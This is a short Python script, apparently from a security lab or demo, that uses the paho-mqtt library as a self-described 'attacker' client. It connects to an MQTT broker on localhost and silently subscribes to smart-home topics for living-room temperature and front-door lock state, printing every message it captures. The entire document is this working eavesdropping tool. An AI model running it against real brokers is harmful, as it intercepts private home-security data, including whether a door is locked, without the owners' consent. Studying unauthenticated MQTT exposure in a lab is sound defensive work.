import time, paho.mqtt.client as mqtt

def on_message(client, userdata, msg):
    print(f"[eavesdrop] {msg.topic} = {msg.payload.decode(errors='replace')}")

client = mqtt.Client(client_id="attacker-eavesdrop")
client.on_message = on_message
client.connect("localhost", 1883, 60)
client.subscribe("home/livingroom/temperature")   # target: sensor data
client.subscribe("home/frontdoor/lock/state")      # target: lock status
print("[eavesdrop] passively capturing sensitive topics (Ctrl+C to stop)...")
client.loop_forever()
